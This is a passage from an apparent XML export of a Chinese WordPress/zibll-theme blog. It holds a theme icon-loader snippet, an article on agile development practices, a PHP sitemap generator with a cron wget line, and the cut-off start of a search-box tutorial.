onclick=&quot;window.open(&#x27;https://myssl.com/seal/detail?domain=blog.gjcloak.top&#x27;,&#x27;MySSL安全签章&#x27;,&#x27;height=800,width=470,top=0,right=0,toolbar=no,menubar=no,scrollbars=no,resizable=no,location=no,status=no&#x27;)&quot;&gt;SSL加密&lt;/a&gt;&lt;/span&gt;</span><br><span class="line">        &lt;/nav&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>其中</p><p>[hidecontent type&#x3D;”logged” desc&#x3D;”隐藏内容：登录后可查看”]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://cos.gjcloak.xyz/blog/js/down-icon.js</span><br><span class="line">https://cos.gjcloak.xyz/pigo/202302200813397.png?imageMogr2/format/webp/interlace/1/quality/80 （原图看这：https://img.cdn.nesxc.com/pic/S1/63535dafcb3cc.png）</span><br><span class="line">LOGO：https://cos.gjcloak.xyz/pigo/202303301140324.png?imageMogr2/format/webp/interlace/1/quality/0</span><br></pre></td></tr></table></figure><p>可以更换成自己的链接</p><h2 id="down-icon-js-代码"><a href="#down-icon-js-代码" class="headerlink" title="down-icon.js 代码"></a>down-icon.js 代码</h2><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">window._iconfont_svg_string_3722327=&#x27;&lt;svg&gt;&lt;symbol id=&quot;icon-liuyan&quot; viewBox=&quot;0 0 1024 1024&quot;&gt;&lt;path d=&quot;M896 192H128c-35.3 0-64 28.7-64 64v512c0 35.3 28.7 64 64 64h576.6l191.6 127.7L896 832c35.3 0 64-28.7 64-64V256c0-35.3-28.7-64-64-64z&quot; fill=&quot;#3D5AFE&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M640 512c0-125.4-51.5-238.7-134.5-320H128c-35.3 0-64 28.7-64 64v512c0 35.3 28.7 64 64 64h377.5c83-81.3 134.5-194.6 134.5-320z&quot; fill=&quot;#536DFE&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M256 512m-64 0a64 64 0 1 0 128 0 64 64 0 1 0-128 0Z&quot; fill=&quot;#FFFF8D&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M512 512m-64 0a64 64 0 1 0 128 0 64 64 0 1 0-128 0Z&quot; fill=&quot;#FFFF00&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M768 512m-64 0a64 64 0 1 0 128 0 64 64 0 1 0-128 0Z&quot; fill=&quot;#FFEA00&quot; &gt;&lt;/path&gt;&lt;/symbol&gt;&lt;symbol id=&quot;icon-SSLzhengshu&quot; viewBox=&quot;0 0 1024 1024&quot;&gt;&lt;path d=&quot;M0 115.2m76.8 0l870.4 0q76.8 0 76.8 76.8l0 640q0 76.8-76.8 76.8l-870.4 0q-76.8 0-76.8-76.8l0-640q0-76.8 76.8-76.8Z&quot; fill=&quot;#1989FA&quot; opacity=&quot;.3&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M563.2 396.8m25.6 0l281.6 0q25.6 0 25.6 25.6l0 0q0 25.6-25.6 25.6l-281.6 0q-25.6 0-25.6-25.6l0 0q0-25.6 25.6-25.6Z&quot; fill=&quot;#1989FA&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M563.2 512m25.6 0l281.6 0q25.6 0 25.6 25.6l0 0q0 25.6-25.6 25.6l-281.6 0q-25.6 0-25.6-25.6l0 0q0-25.6 25.6-25.6Z&quot; fill=&quot;#1989FA&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M563.2 640m25.6 0l140.8 0q25.6 0 25.6 25.6l0 0q0 25.6-25.6 25.6l-140.8 0q-25.6 0-25.6-25.6l0 0q0-25.6 25.6-25.6Z&quot; fill=&quot;#1989FA&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M294.4 422.4m-140.8 0a140.8 140.8 0 1 0 281.6 0 140.8 140.8 0 1 0-281.6 0Z&quot; fill=&quot;#1989FA&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M261.1584 611.5328l-73.0624 126.5536-88.6912-51.2 69.0432-119.5776a191.3088 191.3088 0 0 0 92.7104 44.224z m162.816-47.4496l66.9696 116.0064-88.6784 51.2-69.6832-120.6912a191.4496 191.4496 0 0 0 91.392-46.5152z&quot; fill=&quot;#1989FA&quot; &gt;&lt;/path&gt;&lt;/symbol&gt;&lt;symbol id=&quot;icon-fuwuqi&quot; viewBox=&quot;0 0 1024 1024&quot;&gt;&lt;path d=&quot;M891.0336 879.3088H134.6048c-11.3152 0-20.48-9.1648-20.48-20.48v-222.72h797.3376v222.72c0.0512 11.3152-9.1648 20.48-20.4288 20.48z&quot; fill=&quot;#DCEDFF&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M891.0336 124.0576H134.6048c-25.3952 0-46.08 20.6848-46.08 46.08v688.64c0 25.3952 20.6848 46.08 46.08 46.08h756.3776c25.3952 0 46.08-20.6848 46.08-46.08V170.1376c0.0512-25.3952-20.6336-46.08-46.0288-46.08zM139.7248 418.4576h746.1376v192H139.7248v-192z m0-243.2h746.1376v192H139.7248v-192z m746.1888 678.4512H139.7248v-192h746.1376v192z&quot; fill=&quot;#5B90EF&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M749.9776 267.9808m-31.3344 0a31.3344 31.3344 0 1 0 62.6688 0 31.3344 31.3344 0 1 0-62.6688 0Z&quot; fill=&quot;#6491F2&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M749.9776 514.4576m-31.3344 0a31.3344 31.3344 0 1 0 62.6688 0 31.3344 31.3344 0 1 0-62.6688 0Z&quot; fill=&quot;#6491F2&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M749.9776 757.7088m-31.3344 0a31.3344 31.3344 0 1 0 62.6688 0 31.3344 31.3344 0 1 0-62.6688 0Z&quot; fill=&quot;#6491F2&quot; &gt;&lt;/path&gt;&lt;/symbol&gt;&lt;symbol id=&quot;icon-canbaozhuangtai&quot; viewBox=&quot;0 0 1024 1024&quot;&gt;&lt;path d=&quot;M869.181 128c45.105 0 81.676 36.571 81.676 81.676v324.267c-41.447-40.229-98.743-64.61-160.914-64.61-129.22 0-232.838 104.838-232.838 232.838 0 71.924 32.914 136.534 84.114 179.2H136.533c-45.104 0-81.676-36.571-81.676-81.676V209.676c0-45.105 36.572-81.676 81.676-81.676h732.648z m-74.362 402.286c96.305 0 173.105 78.019 173.105 173.104s-76.8 174.324-173.105 174.324-173.105-78.019-173.105-173.104 78.02-174.324 173.105-174.324z m108.495 115.81h-29.257c-2.438 0-4.876 1.218-6.095 2.437h-2.438l-92.648 86.553-48.762-45.105c-1.219-1.22-3.657-2.438-6.095-2.438h-30.476c-2.438 0-6.095 1.219-8.533 3.657-3.658 3.657-3.658 9.752 0 14.629l1.219 1.219 73.142 68.266c4.877 4.876 10.972 7.315 17.067 7.315h7.314c4.877-1.22 10.972-2.439 14.629-6.096l2.438-1.219 115.81-108.495c2.438-2.438 3.657-4.876 3.657-8.533 0-7.315-4.876-12.19-10.972-12.19zM252.343 463.237l-6.095 1.22c-7.315 2.437-15.848 4.875-23.162 7.313l-8.534 3.658-59.733 26.819c-15.848 7.314-26.819 23.162-28.038 40.228V563.2c0 8.533 6.095 14.629 13.41 15.848h326.704c7.315-1.22 13.41-6.096 13.41-13.41v-19.505c0-17.066-9.753-34.133-25.6-41.447l-2.438-1.22-60.953-28.037c-10.971-4.877-20.724-8.534-31.695-10.972l-4.876-1.219c-34.133-8.533-69.486-8.533-102.4 0z m51.2-264.533c-62.172 0-112.153 49.98-112.153 110.933 0 42.667 24.381 80.457 60.953 98.743 15.847 7.314 32.914 12.19 51.2 12.19s35.352-4.876 51.2-12.19c36.571-18.286 60.952-56.076 60.952-98.743 0-60.952-49.98-110.933-112.152-110.933z&quot; fill=&quot;#1679FF&quot; &gt;&lt;/path&gt;&lt;/symbol&gt;&lt;symbol id=&quot;icon-pengyouquan&quot; viewBox=&quot;0 0 1024 1024&quot;&gt;&lt;path d=&quot;M217.061339 810.97913a425.984 425.984 0 1 0 602.421836-602.442865 425.984 425.984 0 1 0-602.421836 602.442865Z&quot; fill=&quot;#00A0E9&quot; &gt;&lt;/path&gt;&lt;path d=&quot;M602.9312 436.1728c0-54.528-0.1024-109.1072 0.1536-163.6352 0-5.5808-2.816-6.8096-7.0144-8.0384-33.2288-9.8304-67.1744-13.568-101.6832-10.496-21.4016 1.8944-42.4448 6.0928-63.6928 15.0016l171.9808 169.984c0.1024-0.4608 0.256-1.6384 0.256-2.816zM754.8416 425.0112c-57.9072 57.1392-117.3504 115.6608-174.6432 172.2368 1.024 0 1.6896 0 2.8672-0.1024h6.7584c53.0432 0 106.0352-0.1536 159.0784 0.2048 6.9632 0.0512 9.5232-2.6624 10.8032-8.6528 4.864-22.9376 9.5232-44.9536 10.5472-68.864 1.4336-32.256-3.328-63.6416-15.4112-94.8224zM429.6192 586.496c0 53.0432 0.1536 106.0864-0.2048 159.0784-0.0512 6.7072 2.6624 8.7552 8.0384 10.4448 22.6816 7.0656 45.9776 10.1376 69.5808 10.9056 32.0512 1.0752 63.2832-3.328 94.464-15.5648l-171.8784-173.7216v8.8576zM530.7904 400.384c-2.048-2.2016-3.6352-4.096-5.3248-5.8368-37.3248-37.3248-74.8032-74.5472-111.872-112.1792-4.9152-4.9664-8.3456-4.5568-13.6704-1.536-33.4848 18.8928-62.3104 43.2128-84.7872 74.4448-9.7792 13.568-20.736 30.0544-28.672 45.056 1.792 0.0512 2.7136 0 4.096 0.0512h240.2304zM743.7312 402.0224c4.096-4.096 2.304-7.0144 0.256-10.7008-23.1936-41.984-55.1424-75.5712-96.2048-100.3008-7.0656-4.2496-14.592-7.68-23.3984-12.2368v242.176c1.28-0.9728 2.304-1.6384 3.1232-2.4576 38.7072-38.8608 77.3632-77.7728 116.224-116.48zM446.464 424.1408c-54.5792 0.4608-109.1072 0.0512-163.6864-0.1536-5.6832 0-6.7584 3.2768-7.936 7.3216-7.4752 25.7024-11.4688 51.968-11.3152 78.7456 0.1536 29.184 4.7104 57.4976 15.9744 85.8624 56.3712-57.6512 112.384-114.7904 168.192-171.8784-0.3584 0.0512-0.8704 0.1024-1.2288 0.1024zM409.9072 741.1712V500.3776c-40.3456 40.704-81.152 81.8176-122.4192 123.4432 27.2896 50.9952 66.6624 91.392 122.4192 117.3504zM504.4736 622.1312c39.1168 39.1168 78.2336 78.1824 117.1968 117.4528 3.4304 3.4304 5.8368 2.56 9.216 0.6656 47.8208-26.5216 85.1456-63.3344 110.08-112.2816 1.1776-2.304 1.9456-4.864 3.328-8.448H502.7328c0.8704 1.3824 1.2288 2.0992 1.7408 2.6112z&quot; fill=&quot;#FFFFFF&quot; &gt;&lt;/path&gt;&lt;/symbol&gt;&lt;/svg&gt;&#x27;,function(l)&#123;var t=(t=document.getElementsByTagName(&quot;script&quot;))[t.length-1],e=t.getAttribute(&quot;data-injectcss&quot;),t=t.getAttribute(&quot;data-disable-injectsvg&quot;);if(!t)&#123;var c,i,a,n,o,h=function(t,e)&#123;e.parentNode.insertBefore(t,e)&#125;;if(e&amp;&amp;!l.__iconfont__svg__cssinject__)&#123;l.__iconfont__svg__cssinject__=!0;try&#123;document.write(&quot;&lt;style&gt;.svgfont &#123;display: inline-block;width: 1em;height: 1em;fill: currentColor;vertical-align: -0.1em;font-size:16px;&#125;&lt;/style&gt;&quot;)&#125;catch(t)&#123;console&amp;&amp;console.log(t)&#125;&#125;c=function()&#123;var t,e=document.createElement(&quot;div&quot;);e.innerHTML=l._iconfont_svg_string_3722327,(e=e.getElementsByTagName(&quot;svg&quot;)[0])&amp;&amp;(e.setAttribute(&quot;aria-hidden&quot;,&quot;true&quot;),e.style.position=&quot;absolute&quot;,e.style.width=0,e.style.height=0,e.style.overflow=&quot;hidden&quot;,e=e,(t=document.body).firstChild?h(e,t.firstChild):t.appendChild(e))&#125;,document.addEventListener?~[&quot;complete&quot;,&quot;loaded&quot;,&quot;interactive&quot;].indexOf(document.readyState)?setTimeout(c,0):(i=function()&#123;document.removeEventListener(&quot;DOMContentLoaded&quot;,i,!1),c()&#125;,document.addEventListener(&quot;DOMContentLoaded&quot;,i,!1)):document.attachEvent&amp;&amp;(a=c,n=l.document,o=!1,s(),n.onreadystatechange=function()&#123;&quot;complete&quot;==n.readyState&amp;&amp;(n.onreadystatechange=null,d())&#125;)&#125;function d()&#123;o(o=!0,a())&#125;function s()&#123;try&#123;n.documentElement.doScroll(&quot;left&quot;)&#125;catch(t)&#123;return void setTimeout(s,50)&#125;d()&#125;&#125;(window);</span><br></pre></td></tr></table></figure><p>代码默认屏蔽手机端显示，你可以删除以下代码在手机端显示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style type=&quot;text/css&quot;&gt;@media screen and (max-width:768px)&#123;.pc-down&#123;display:none;&#125;&#125;&lt;/style&gt;</span><br></pre></td></tr></table></figure><p><strong><em>部分css是直接用的子比css，如果你的站点显示错误，可能需要你自己调试css！</em></strong></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 子比美化 </tag>
            
            <tag> wordpress </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何做好敏捷式开发？</title>
      <link href="/795.html"/>
      <url>/795.html</url>
      
        <content type="html"><![CDATA[<p>在工作中接触到“敏捷”一词时，也会感觉到模式和难以理解。从需求到设计每一步都需要了解清楚，那么敏捷开发这种模式该如何做呢，我们一起来看看吧。</p><p>刚接触敏捷时我对这种模式是不能理解的，没有调研没有文档，从需求到设计用的方法和学校里所学的完全不一样，但经过两年的工作后，我的认知开始发生变化，下面我将作为一个UI&#x2F;UX分享一些我对敏捷式开发的理解。</p><p>在互联网行业中，一个项目的完整生命周期都是由一个团队完成的，团队成员也许会变化，但任何一个角色都不可或缺。</p><p>为了更好地完成共同目标，团队成员除了在自己负责的领域是专家，还需要了解其他人的工作内容及整个团队的工作模式。工作模式是连接团队成员的一种运作方式，要求每个人都清晰了解，并认同。</p><h2 id="敏捷式开发宣言（Agile-Program-Development）"><a href="#敏捷式开发宣言（Agile-Program-Development）" class="headerlink" title="敏捷式开发宣言（Agile Program Development）"></a>敏捷式开发宣言（Agile Program Development）</h2><p>起源于20世纪90年代，由开发程序员提出，是相对于传统软件开发方法（如瀑布流模型）而言的一种新软件开发模式。这里认为该模式不仅仅适用于开发，也适用于团队除开发外的其他角色，因此将它视作为团队工作模式。下图为敏捷开发的价值观。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/image-10-1024x509.png" alt="image"></p><p><strong>个体和互动高于流程和工具：</strong>人是最重要的因素，敏捷提倡打破部门的概念，人与人之间面对面沟通，交流。敏捷的办公室常常是很热闹的。</p><p><strong>工作的软件高于详尽的文档：</strong>看文档是一件让人头疼的事，无论是需求或技术文档，撰写和维护都需要耗费大量的人力，文档的不灵活性让其地位在敏捷开发中地位降低，因此这里的文档要尽可能精简，能用软件替代文档的任务首选软件。</p><p><strong>客户合作高于合同谈判：</strong>客户对产品的需求会随着他自己的认知和心情变化，能从一开始就确定细节的项目实在太少，经常与客户沟通，给予反馈才能促成项目的成功。</p><p><strong>响应变化高于遵循计划：</strong>和瀑布流中将产品的功能完全规划好后集中开发不同，不断变化的需求让敏捷从业者制定计划时尽可能的简化，这里可以结合MVP（Minimum Viable Product 最小可行性产品）的概念去理解。</p><p>每次迭代交付一个可用的最小功能，这个功能时是不完美的、简陋的，只能满足用户最基本的需求，然后通过后期客户的正反馈慢慢完善功能。这种方式试错成本低，能快速应对需求变化。</p><h2 id="二、工作流程"><a href="#二、工作流程" class="headerlink" title="二、工作流程"></a>二、工作流程</h2><p>这里简单描述自己工作中两周为一个迭代的工作流程。</p><p>一个开发阶段称为一个Sprint（冲刺），每个Sprint开始前，都会举行一个Planning Meeting（计划会）来共同规划这个迭代的开发任务，会议主持人一般为PM（产品经理）或PO（Product Owner，产品负责人）。</p><p>会上，PO会向团队成员展示列入这个迭代开发的需求。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/image-11-1024x479.png" alt="image"></p><p>每一个需求都是一个或多个任务（Task），PO根据优先级安排要开发的任务，描述每个任务要达到的目标，和设计、开发、测试确认，在Scrum Master（敏捷教练，一般为技术大牛）的协作下找到任务处理人并以工时为单位预估任务完成需要的时间。</p><p>最后，团队成员之间聊个五毛话题增进感情，Planning Meeting就算结束了。在接下来的两周内，每天上午团队成员要开一个简短的Standing Meeting（站会），每人说明昨天做了什么，完成度如何，如有拖延是因为什么原因，是否需要其他成员帮助，以及今天计划要完成的任务。</p><p>一周下来，要开一个半程回顾会，了解开发进度，若有延迟，及时做出对应调整。两周下来是一个全程Review Meeting（回顾会），回顾这个迭代的完成度，并展示实现的功能，现场Demo。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/image-12-1024x523.png" alt="image"></p><h2 id="三、部分概念理解"><a href="#三、部分概念理解" class="headerlink" title="三、部分概念理解"></a>三、部分概念理解</h2><p>注：这部分示例图来自腾讯敏捷类办公产品Tapd。</p><h3 id="1-需求及任务（Story-and-Task"><a href="#1-需求及任务（Story-and-Task" class="headerlink" title="1. 需求及任务（Story and Task )"></a>1. 需求及任务（Story and Task )</h3><p>需求由PO建立，是将用户故事（User Story）简化后的产物，描述在什么场景下需要完成什么样的功能，对开发而言就是一个开发任务（Task）。</p><p>功能比较复杂的需求往往会被拆解成多个需求，拆分到以用户角度可接受的最小颗粒度功能作为子需求，以父子需求的方式进行关联。开发的角度上看可以由一个开发（Story Owner）接下这个任务，再分配给其他开发人员。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/image-13-1024x506.png" alt="image"></p><h3 id="2-需求池（Backlog）"><a href="#2-需求池（Backlog）" class="headerlink" title="2. 需求池（Backlog）"></a>2. 需求池（Backlog）</h3><p>需求池里记录着待开发的需求及优先级，优先级按照对用户的价值进行排序，高的会先开发。PO在表述需求时往往不会有详细的需求文档，一般会用简短的文字描述在需求详情里，再加上面对面沟通将需求传递给设计或是开发。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/image-14-1024x487.png" alt="image"></p><h3 id="3-故事板（Story-Board）"><a href="#3-故事板（Story-Board）" class="headerlink" title="3. 故事板（Story Board）"></a>3. 故事板（Story Board）</h3><p>以卡片的形式展示当前迭代的进度，包括任务内容，优先级，处理人，状态等信息。PO可从这里清楚地看到团队的进度，开发也可以通过筛选来了解自己各种状态的开发任务。</p><p><img src="https://cos.gjcloak.xyz/wp-content/uploads/2023/03/image-15-1024x497.png" alt="image"></p><h3 id="4-工时"><a href="#4-工时" class="headerlink" title="4. 工时"></a>4. 工时</h3><p>工时是影响一个迭代完成度的重要因素，涉及到任务处理人对工时的预估，如果实际工时高于预估，势必会造成任务延期或开发加班，影响整个迭代的完成度，如果实际工时低于预估，便会造成人力资源的浪费，影响效率。</p><p>准确的预估工时需要开发人员有丰富的经验，掌握业务逻辑，了解自己的开发能力，此外工时还包括安全时间，以处理特殊情况。</p><p>一般每个开发一周有略低于40（5×8）个工时的任务量。处理Bug所用时间不算在工时内，Bug秉承优先解决，谁开发谁解决的原则。</p><h2 id="四、成也灵活，败也灵活"><a href="#四、成也灵活，败也灵活" class="headerlink" title="四、成也灵活，败也灵活"></a>四、成也灵活，败也灵活</h2><p>敏捷的特点，优点，缺点都是灵活。</p><p><strong>优点：</strong></p><ul><li>应对需求的灵活性让功能的开发时间缩短，可尽早得到市场的反馈，提高规避风险的能力</li><li>人与人之间的直接沟通能充分利用时间，工作效率提高</li></ul><p><strong>缺点：</strong></p><ul><li>面对面沟通让信息传递的质量随传递人数的增加而降低，从产品到设计到开发再到测试的信息传递会出现偏差，这让敏捷在大项目大团队中的实施变得困难</li><li>较少的文档在团队人员过多，人员变动或项目持续时间较长时无法全面了解到产品的全貌，沟通成本增加</li></ul><h2 id="五、总结"><a href="#五、总结" class="headerlink" title="五、总结"></a>五、总结</h2><ul><li>敏捷是一种理念，原则，价值观，不同的团队在实行这个模式都是不同的。</li><li>实行敏捷的目的是为了帮助团队高效地合作沟通，过程中的去文档，去流程，面对面沟通都只是手段，最后还是以结果为导向。切记敏捷流于形式，纠结于步骤！</li><li>敏捷要求团队成员有很强的主观能动性，并能主动推进整个项目前进，当他人停滞不前时，PUSH他们。</li><li>敏捷团队的建立需要时间和经验积累，当任务出现问题时主动承担责任优于互相推诿，成员间切忌心存芥蒂，这样才能保持团队的凝聚力。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 初级 </tag>
            
            <tag> 敏捷开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>无插件实现生成sitemap.xml文件【实测有效】</title>
      <link href="/779.html"/>
      <url>/779.html</url>
      
        <content type="html"><![CDATA[<p>在网站根目录创建sitemap.php文件，再把下面代码放入</p><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require(&#x27;./wp-blog-header.php&#x27;);</span><br><span class="line">header(&quot;Content-type: text/xml&quot;);</span><br><span class="line">header(&#x27;HTTP/1.1 200 OK&#x27;);</span><br><span class="line">$posts_to_show = 1000;</span><br><span class="line">echo &#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&#x27;;</span><br><span class="line">echo &#x27;&lt;urlset xmlns=&quot;http://www.sitemaps.org/schemas/sitemap/0.9&quot; xmlns:mobile=&quot;http://www.baidu.com/schemas/sitemap-mobile/1/&quot;&gt;&#x27;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php echo get_lastpostdate(&#x27;blog&#x27;); ?&gt;</span><br><span class="line">  &lt;url&gt;</span><br><span class="line">      &lt;loc&gt;&lt;?php echo get_home_url(); ?&gt;&lt;/loc&gt;</span><br><span class="line">      &lt;lastmod&gt;&lt;?php $ltime = get_lastpostmodified(GMT);$ltime = gmdate(&#x27;Y-m-d\TH:i:s+00:00&#x27;, strtotime($ltime)); echo $ltime; ?&gt;&lt;/lastmod&gt;</span><br><span class="line">      &lt;changefreq&gt;daily&lt;/changefreq&gt;</span><br><span class="line">      &lt;priority&gt;1.0&lt;/priority&gt;</span><br><span class="line">  &lt;/url&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/* 文章页面 */</span><br><span class="line">$myposts = get_posts( &quot;numberposts=&quot; . $posts_to_show );</span><br><span class="line">foreach( $myposts as $post ) &#123; ?&gt;</span><br><span class="line">  &lt;url&gt;</span><br><span class="line">      &lt;loc&gt;&lt;?php the_permalink(); ?&gt;&lt;/loc&gt;</span><br><span class="line">      &lt;lastmod&gt;&lt;?php the_time(&#x27;c&#x27;) ?&gt;&lt;/lastmod&gt;</span><br><span class="line">      &lt;changefreq&gt;monthly&lt;/changefreq&gt;</span><br><span class="line">      &lt;priority&gt;0.6&lt;/priority&gt;</span><br><span class="line">  &lt;/url&gt;</span><br><span class="line">&lt;?php &#125; /* 文章循环结束 */ ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/* 单页面 */</span><br><span class="line">$mypages = get_pages();</span><br><span class="line">if(count($mypages) &gt; 0) &#123;</span><br><span class="line">    foreach($mypages as $page) &#123; ?&gt;</span><br><span class="line">    &lt;url&gt;</span><br><span class="line">      &lt;loc&gt;&lt;?php echo get_page_link($page-&gt;ID); ?&gt;&lt;/loc&gt;</span><br><span class="line">      &lt;lastmod&gt;&lt;?php echo str_replace(&quot; &quot;,&quot;T&quot;,get_page($page-&gt;ID)-&gt;post_modified); ?&gt;+00:00&lt;/lastmod&gt;</span><br><span class="line">      &lt;changefreq&gt;weekly&lt;/changefreq&gt;</span><br><span class="line">      &lt;priority&gt;0.6&lt;/priority&gt;</span><br><span class="line">  &lt;/url&gt;</span><br><span class="line">&lt;?php &#125;&#125; /* 单页面循环结束 */ ?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">/* 博客分类 */</span><br><span class="line">$terms = get_terms(&#x27;category&#x27;, &#x27;orderby=name&amp;hide_empty=0&#x27; );</span><br><span class="line">$count = count($terms);</span><br><span class="line">if($count &gt; 0)&#123;</span><br><span class="line">foreach ($terms as $term) &#123; ?&gt;</span><br><span class="line">    &lt;url&gt;</span><br><span class="line">      &lt;loc&gt;&lt;?php echo get_term_link($term, $term-&gt;slug); ?&gt;&lt;/loc&gt;</span><br><span class="line">      &lt;changefreq&gt;weekly&lt;/changefreq&gt;</span><br><span class="line">      &lt;priority&gt;0.8&lt;/priority&gt;</span><br><span class="line">  &lt;/url&gt;</span><br><span class="line">&lt;?php &#125;&#125; /* 分类循环结束 */?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> /* 标签(可选) */</span><br><span class="line">$tags = get_terms(&quot;post_tag&quot;);</span><br><span class="line">foreach ( $tags as $key =&gt; $tag ) &#123;</span><br><span class="line">    $link = get_term_link( intval($tag-&gt;term_id), &quot;post_tag&quot; );</span><br><span class="line">         if ( is_wp_error( $link ) )</span><br><span class="line">          return false;</span><br><span class="line">          $tags[ $key ]-&gt;link = $link;</span><br><span class="line">?&gt;</span><br><span class="line"> &lt;url&gt;</span><br><span class="line">      &lt;loc&gt;&lt;?php echo $link ?&gt;&lt;/loc&gt;</span><br><span class="line">      &lt;changefreq&gt;monthly&lt;/changefreq&gt;</span><br><span class="line">      &lt;priority&gt;0.4&lt;/priority&gt;</span><br><span class="line">  &lt;/url&gt;</span><br><span class="line">&lt;?php  &#125; /* 标签循环结束 */ ?&gt;</span><br><span class="line">&lt;/urlset&gt;</span><br></pre></td></tr></table></figure><p>在宝塔的计划任务建一个shell脚本定时任务，写入下列代码，定时执行即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget -O /服务器下路径sitemap.xml要存放的路径</span><br><span class="line">https://你的域名/sitemap.php  &gt;/dev/null 2&gt;&amp;1</span><br></pre></td></tr></table></figure><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/image-3-1024x499.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 教程 </tag>
            
            <tag> 子比美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zibll子比主题首页大图搜索框</title>
      <link href="/764.html"/>
      <url>/764.html</url>
      
        <content type="html"><![CDATA[<p>先看效果</p><p><img src="https://blog.gjcloak.top/wp-content/uploads/2023/03/image-1024x450.png" alt="image"></p><p>首先在主题目录下创建 func.php 文件，有的人可能已经有此文件了。</p><p>在func.php添加如下代码</p><p>[hidecontent type&#x3D;”reply” desc&#x3D;”隐藏内容：评论后查看”]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span 